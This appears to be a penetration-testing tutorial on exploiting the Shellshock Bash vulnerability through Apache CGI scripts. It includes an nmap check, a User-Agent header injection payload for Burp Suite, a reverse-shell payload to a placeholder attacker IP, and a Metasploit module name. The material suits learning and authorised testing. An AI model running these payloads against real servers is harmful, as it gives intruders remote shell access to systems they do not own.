# Exploiting Bash CVE-2014-6271 Vulnerability (Shellshock)

## CVE-2014-6271 - Shellshock

* Shellshock (CVE-2014-6271) is the name given to a family of vulnerabilities in the Bash shell (since V1.3) that allow an attacker to execute remote arbitrary commands via Bash, consequently allowing the attacker to obtain remote access to the target system via a reverse shell.

## How it works

* The Shellshock vulnerability is caused by a vulnerability in Bash, whereby Bash mistakenly executes trailing commands after a series of characters: () {:;};.&#x20;
* This vulnerability only affects Linux as Windows does not use utilize Bash as it is not a \*Nix based operating system.&#x20;
* In the context of remote exploitation, Apache web servers configured to run CGI scripts or .sh scripts are also vulnerable to this attack.&#x20;
* CGI (Common Gateway Interface) scripts are used by Apache to execute arbitrary commands on the Linux system, after which the output is displayed to the client.

## Shellshock Exploitation

* In order to exploit this vulnerability, you will need to locate an input vector or script that allows you to communicate with Bash.&#x20;
* In the context of an Apache web server, we can utilize any legitimate CGI scripts accessible on the web server.&#x20;
* Whenever a CGI script is executed, the web server will initiate a new process and run the CGI script with Bash.&#x20;
* This vulnerability can be exploited both manually and automatically with the use of an MSF exploit module.

## Practical Demo

### Manual Exploitation

* <mark style="color:yellow;">nmap -sV targetIP --script=http-shellshock --script-args=http-shellshock.uri=locationofcgiscript</mark>
  * This command tells you if the target is vulnerable to Shellshock vulnerability

### BurpSuite

Enable the proxy, intercept has to be on.

For this vulnerability we will modify the <mark style="color:red;">User-Agent</mark> header.

Send the request to the repeater.

<mark style="color:purple;">NOTE:</mark> FoxyProxy Extension on Chrome is really useful

#### Modified request

* User Agent= '<mark style="color:yellow;">() { :; }; echo; echo;</mark>' /bin/bash -c 'insert here the commands to run'
  * The yellow highlighted character are necessary to trick bash to executing the commands after
  * <mark style="color:purple;">NOTE:</mark> Commands to be executed have to be inside single quotes

#### Reverse shell from shellshock

Open a listener port with netcat

* User Agent= " '<mark style="color:yellow;">() { :; }; echo; echo;</mark>' /bin/bash -c 'bash -i>&/dev/tcp/attackerip/receiverport 0>&1'

### MSF Module

Module used:

* <mark style="color:yellow;">exploit/multi/http/apache\_mod\_cgi\_bash\_env\_exec</mark>

Options to set

Target IP

Target Port

TARGETURI
